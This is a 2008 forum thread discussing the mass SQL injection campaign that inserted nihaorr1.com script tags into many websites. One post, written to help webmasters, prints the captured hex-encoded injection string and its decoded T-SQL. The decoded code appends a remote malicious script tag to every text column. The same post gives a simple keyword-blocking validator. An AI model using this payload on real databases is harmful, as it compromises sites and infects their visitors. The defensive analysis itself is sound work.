---
title: "Web infection attacks more than 100,000 pages"
date: 2008-04-24
forum: The Cafe
---

### Post by EMCGFX on 2008-04-24
I found this interesting read, and thought I should share.
Source: [http://www.theregister.co.uk/2008/04/24/mass_web_attack/](http://www.theregister.co.uk/2008/04/24/mass_web_attack/)

Hackers have injected malicious code into hundreds of thousands of reputable web pages, turning them into launchpads for attacks that silently install malware on the machines of those who visit them. The UK's Civil Service and the United Nations were among those who had been hacked.

This Yahoo search returned 173,000 results for the term "nihaorr1," which is part of the address that uses a malicious javascript to attack end users. The rogue URL horns its way onto web pages through a SQL injection vulnerability in IIS and possibly other web servers, according to IT-related web forums.

Websense, which wrote about the mass infection Tuesday, said the attackers perpetrated a similar assault a few weeks ago on news and travel sites. Little is known about the group responsible, except that they're using the nihaorr1.com domain name, which appears on the surface to be registered to someone in Shanghai.

Users visiting an infected site will be redirected to a series of sites that eventually tries to exploit eight different vulnerabilities, all of which have been patched.

We've written plenty about vulnerabilities in browsers, media players and other types of software that are triggered only after the mark visits a website under the control of the attacker. Almost inevitably, a Reg reader comments that only a fool would be drawn to such a place. As mass infections like this one make clear, anyone who visits pages belonging to well-known news and travel sites, the United Nations or governmental agencies on either side of the Atlantic is susceptible.

So if you haven't patched that old version of iTunes or AIM in a while, now might a good time.

---

### Post by SirThom on 2008-04-24
> **EMCGFX said:**
> I found this interesting read, and thought I should share.
Source: [http://www.theregister.co.uk/2008/04/24/mass_web_attack/](http://www.theregister.co.uk/2008/04/24/mass_web_attack/)

Hackers have injected malicious code into hundreds of thousands of reputable web pages, turning them into launchpads for attacks that silently install malware on the machines of those who visit them. The UK's Civil Service and the United Nations were among those who had been hacked.

This Yahoo search returned 173,000 results for the term "nihaorr1," which is part of the address that uses a malicious javascript to attack end users. The rogue URL horns its way onto web pages through a SQL injection vulnerability in IIS and possibly other web servers, according to IT-related web forums.

Websense, which wrote about the mass infection Tuesday, said the attackers perpetrated a similar assault a few weeks ago on news and travel sites. Little is known about the group responsible, except that they're using the nihaorr1.com domain name, which appears on the surface to be registered to someone in Shanghai.

Users visiting an infected site will be redirected to a series of sites that eventually tries to exploit eight different vulnerabilities, all of which have been patched.

We've written plenty about vulnerabilities in browsers, media players and other types of software that are triggered only after the mark visits a website under the control of the attacker. Almost inevitably, a Reg reader comments that only a fool would be drawn to such a place. As mass infections like this one make clear, anyone who visits pages belonging to well-known news and travel sites, the United Nations or governmental agencies on either side of the Atlantic is susceptible.

So if you haven't patched that old version of iTunes or AIM in a while, now might a good time.

If I had windoze then it might be a concern.  But doing anything on the internet in Windows puts one in great danger.

---

### Post by SuperSon!c on 2008-04-24
> **SirThom said:**
> If I had windoze then it might be a concern.  But doing anything on the internet in Windows puts one in great danger.

yep, if you're a noob.  and click on whatever looks shiny or is flashing.  of course "noobs" are 90% of computer users regardless of OS.

---

### Post by tubezninja on 2008-04-24
Heh, as the article points out...
> Almost inevitably, a Reg reader comments that only a fool would be drawn to such a place. As mass infections like this one make clear, anyone who visits pages belonging to well-known news and travel sites, the United Nations or governmental agencies on either side of the Atlantic is susceptible.

Unfortunately, this particular situation goes beyond attracting lemmings who click on links they shouldn't.  Merely visiting sites like those belonging to the UN on a vulnerable system will get you infected with the payload.  

This vulnerability pretty much targets users of unpatched WIndows installations (the patch has been out for almost a year), as well as servers running unpatched versions of IIS.  

Still, given how long the patch has been around, it's VERY disheartening to do a google search and seeing how many sites are carriers to this vulnerability.  This means that a very BIG part of the problem isn't "noob" users... it's lazy/incompetent/nonexistent IIS sysadmins who have failed to do minimal work to secure their web servers.

It looks like lots of little mom & pop sites whose patches have clearly been neglected for a long time, but there are also sites belonging to larger groups that you THINK would have better resources.

This might not affect us directly, but it's still important to be aware of the problem and to spread the word.  Just like some us scan for viruses, even though the viruses have no effect on us.

---

### Post by Sef on 2008-04-24
If they attack Flash or Java, then any os using those programs can be attacked.

---

### Post by gsmanners on 2008-04-24
I don't know. Much as I think Windows servers are pretty lame, this bug isn't really the web server or SQL. This is really about bad coding on the server side.

---

### Post by SirThom on 2008-04-24
> **SuperSon!c said:**
> yep, if you're a noob.  and click on whatever looks shiny or is flashing.  of course "noobs" are 90% of computer users regardless of OS.

Windows is poorly designed.  If I build an unsafe car, do I blame the drivers for not compensating for it's defects?

---

### Post by nhertz on 2008-04-24
Just to follow up on all the talk and different theories regarding the massive ongoing iframe injections pointing to domains such as nmidahena.com, aspder.com and more recently: nihaorr1.com

My intention is to focus a little on the facts rather than amplify the ongoing rumors and theories since this is causing frustrated webmasters to attempt hundreds of different methods to avoid these attacks with no luck.

To answer the question whether this attack might be using more complex methods beyond just a simple sql injection, the answer is yes and no.
The injection appears to be VERY SIMPLE. It does not need to be an ASP page containing a form. Last week we cleaned and patched up more than 10 websites affected by these attacks and 8 of them had been injected through the query string of a simple "select" page. No forms or update statements existed on the pages from where the injection was entering.
However, the command being executed is fairly complex in itself.

I'm saying this because many webmasters are going mad patching up sensitive forms, restricting session id's etc.. only to get attacked again and again.

You will indeed need to strengthen your code the sooner the better, but in this particular case consider the following for a temporary solution:

Create an include file with something like this:

<%
if instr(lcase(sql),";--")>0 then
response.redirect("index.asp")
end if
if instr(lcase(sql),"nvarchar")>0 then
response.redirect("index.asp")
end if
%>

Call it, forexample, Validator.asp and put it right before your select statements are executed:

<%
some code here....
%> 
<!--#include file="validator.asp"-->
<%
rs.Open sql
%>

This will not permit some of the key words required to execute this command to take place and therefore the malicious Exec will not be allowed.
Of course you have to discover which pages are being used to inject this code. 
Most likely it is not a page that requires a member session to be viewed since the spiders are attacking pages that are cached in Google.

Is there a tool or a mechanism to find it?

The best way to discover when and where the attack is taking place is by running, for example, SQL Server Profiler.
Set it to record only Exec commands and when the injection happens it will show up and should reflect something like this:

SELECT Musicas.Artistas, Musicas.Titles, Musicas.Formatos, Musicas.MemIDs, Musicas.Enlsae, Mem.Statesa, Mem.Cities, Mem.Paises, Mem.Users FROM Musicas, Mem Where Musicas.Titles = 'acb;DECLARE @S NVARCHAR(4000);SET @S=CAST0x440045000043005500520053004F005200200046004F0050020004600450054004300480020004E00450058005400
2000460052004F004D00200020005400610062006C0065005F0043007500720073006F007200200049004E0054004F002000400
054002C0040004300200057280076006100720063006800610072002C005B0027002B00400043002B0027005D00290029002B00
270027003C0073006300720069007000740020007300720063003D0068007400740070003A002F002F007700770077002E006E0
06900680061006F00720010062006C0065005F0043007500720073006F007200 
AS NVARCHAR(4000));EXEC(@S);--' And Mem.ID = Musicas.MemIDs ORDER BY Mem.Fealogs DESC

Once you run the statement through the descrypter you'll get something like this:

DECLARE @T varchar(255)'@C varchar(255) DECLARE Table_Cursor CURSOR FOR select a.name'b.name from sysobjects a'syscolumns b where a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T'@C WHILE(@@FETCH_STATUS=0) BEGIN exec('update ['+@T+'] set ['+@C+']=rtrim(convert(varchar'['+@C+']))+''<script src=nihaorr1.com/1.js></script>''')FETCH NEXT FROM Table_Cursor INTO @T'@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor

This shows how the nihaorr1.com domain is being used by the script to harass the users that visit your page where the script is executed.
You can also see from the above command that the Exec will try to inject every table in your database which can contain varchar type.

This is a very annoying attack since the spiders appear to be running in a circle on constant autopilot. However, don't go about thinking that this is as bad as it gets because the Exec command could easily have been programmed to delete your tables and even drop tables if the external users are configured to have such rights. 

I'm saying this to put a rush on everyone affected by these attacks and to get their sites fixed up as soon as possible.
These attacks may just be a pre-warning, and if the attackers alter the code to make it delete and drop instead, then we'll be facing much bigger problems.

Forget about wasting time and money on the famous commercial antivirus and firewall solutions. They cannot do anything against SQL injection attacks and it is a common practice around forums to try and give people a false sense of security by pasting links to different software companies. These attacks are happening where there's vulnerable ASP code and no standard antivirus software can prevent or "clean" the mess. 
Hope this can help some of you.

Regards,

Nicolai Hertz
software programmer

---

### Post by akiratheoni on 2008-04-24
Does this infection only work for IIS or Apache as well?

---

